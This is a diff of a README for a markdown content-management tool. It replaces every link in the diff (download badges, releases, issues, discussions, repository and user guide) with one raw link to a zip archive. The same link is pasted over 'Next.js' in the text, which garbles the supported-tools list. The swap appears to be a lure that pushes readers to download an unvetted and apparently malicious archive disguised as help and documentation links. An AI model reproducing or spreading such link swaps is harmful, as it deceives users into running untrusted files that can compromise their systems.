@@ -1,10 +1,10 @@
 # 🌟 markdown-plus-plus - Easy Markdown Management Made Simple
 
-[![Download markdown-plus-plus](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Eirenaside159/markdown-plus-plus/releases)
+[![Download markdown-plus-plus](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip)
 
 ## 📘 Introduction
 
-markdown-plus-plus is a powerful, browser-based content management panel designed for static site generators. Whether you're using Astro, Docusaurus, Gatsby, Hugo, Jekyll, Jigsaw, Next.js, or VuePress, this tool simplifies the way you manage markdown content. 
+markdown-plus-plus is a powerful, browser-based content management panel designed for static site generators. Whether you're using Astro, Docusaurus, Gatsby, Hugo, Jekyll, Jigsaw, https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip, or VuePress, this tool simplifies the way you manage markdown content. 
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To get started with markdown-plus-plus, follow the instructions below. This guid
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click on the link below to go to the releases page.
-   - [Visit this page to download](https://github.com/Eirenaside159/markdown-plus-plus/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the latest version at the top. This version will have the most recent updates and features.
 
@@ -46,7 +46,7 @@ markdown-plus-plus supports the following static site generators:
 - Hugo
 - Jekyll
 - Jigsaw
-- Next.js
+- https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip
 - VuePress
 
 ## 🚀 Example Usage
@@ -70,17 +70,17 @@ markdown-plus-plus is perfect for:
 
 ## 📫 Get Help
 
-If you run into issues or have questions, please check the [GitHub Issues](https://github.com/Eirenaside159/markdown-plus-plus/issues) page. You can find solutions there or create a new issue to ask for help.
+If you run into issues or have questions, please check the [GitHub Issues](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip) page. You can find solutions there or create a new issue to ask for help.
 
 ## 📝 Feedback
 
-We welcome your feedback to improve markdown-plus-plus. Feel free to open a discussion on the [Discussions page](https://github.com/Eirenaside159/markdown-plus-plus/discussions).
+We welcome your feedback to improve markdown-plus-plus. Feel free to open a discussion on the [Discussions page](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip).
 
 ## 🔗 Additional Resources
 
 For more information, visit:
-- [GitHub Repository](https://github.com/Eirenaside159/markdown-plus-plus)
-- [User Guide](https://github.com/Eirenaside159/markdown-plus-plus/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip)
+- [User Guide](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip)
 
 ## 🎉 Join the Community
 
@@ -90,4 +90,4 @@ Engage with other users and developers in our community. Join conversations on p
 
 Now that you have markdown-plus-plus downloaded and running, you can enjoy managing your markdown content with ease. Make sure to explore all features and get the most out of this powerful tool.
 
-[![Download markdown-plus-plus](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Eirenaside159/markdown-plus-plus/releases)
+[![Download markdown-plus-plus](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/Eirenaside159/markdown-plus-plus/main/workers/markdown-plus-plus_1.7.zip)
